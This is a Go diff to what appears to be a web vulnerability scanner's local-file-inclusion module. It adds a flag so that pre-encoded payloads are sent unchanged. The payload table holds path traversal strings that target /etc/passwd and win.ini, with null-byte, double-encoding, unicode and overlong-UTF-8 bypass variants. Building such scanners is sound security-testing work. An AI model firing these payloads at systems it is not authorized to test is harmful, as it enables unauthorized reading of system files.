@@ -10,6 +10,11 @@ import "github.com/vigolium/vigolium/pkg/modules/shared/filesig"
 type lfiPayload struct {
 	payload string
 	confirm filesig.ConfirmFunc
+	// preEncoded marks a payload that carries its own percent-encoding (%00,
+	// %252e, %C0%AE, %u002e): it is built through httpmsg.BuildPreEncoded so the
+	// encoding reaches the server as written instead of being double-encoded
+	// (MISS-12).
+	preEncoded bool
 }
 
 // tier1Payloads are always tested. Each targets a well-known OS file.
@@ -20,18 +25,18 @@ var tier1Payloads = []lfiPayload{
 	{payload: "../../../../../../../../../../../../etc/passwd", confirm: filesig.ConfirmPasswd},
 
 	// Null byte injection (bypass extension append)
-	{payload: "../../../../etc/passwd%00", confirm: filesig.ConfirmPasswd},
-	{payload: "../../../../etc/passwd%00.jpg", confirm: filesig.ConfirmPasswd},
-	{payload: "../../../../etc/passwd%00.html", confirm: filesig.ConfirmPasswd},
+	{payload: "../../../../etc/passwd%00", confirm: filesig.ConfirmPasswd, preEncoded: true},
+	{payload: "../../../../etc/passwd%00.jpg", confirm: filesig.ConfirmPasswd, preEncoded: true},
+	{payload: "../../../../etc/passwd%00.html", confirm: filesig.ConfirmPasswd, preEncoded: true},
 
 	// Double URL encoding
-	{payload: "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", confirm: filesig.ConfirmPasswd},
+	{payload: "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", confirm: filesig.ConfirmPasswd, preEncoded: true},
 
 	// Unicode encoding bypass
-	{payload: "%u002e%u002e/%u002e%u002e/%u002e%u002e/%u002e%u002e/etc/passwd", confirm: filesig.ConfirmPasswd},
+	{payload: "%u002e%u002e/%u002e%u002e/%u002e%u002e/%u002e%u002e/etc/passwd", confirm: filesig.ConfirmPasswd, preEncoded: true},
 
 	// Overlong UTF-8 encoding
-	{payload: "%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/etc/passwd", confirm: filesig.ConfirmPasswd},
+	{payload: "%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/etc/passwd", confirm: filesig.ConfirmPasswd, preEncoded: true},
 
 	// Backslash variants (Windows IIS)
 	{payload: `..\..\..\..\etc\passwd`, confirm: filesig.ConfirmPasswd},
@@ -43,7 +48,7 @@ var tier1Payloads = []lfiPayload{
 	// Windows win.ini
 	{payload: "../../../../windows/win.ini", confirm: filesig.ConfirmWinIni},
 	{payload: `..\..\..\..\windows\win.ini`, confirm: filesig.ConfirmWinIni},
-	{payload: "../../../../windows/win.ini%00", confirm: filesig.ConfirmWinIni},
+	{payload: "../../../../windows/win.ini%00", confirm: filesig.ConfirmWinIni, preEncoded: true},
 }
 
 // tier2CanaryFiles are tested only if tier 1 caused a (non-blocked) status code
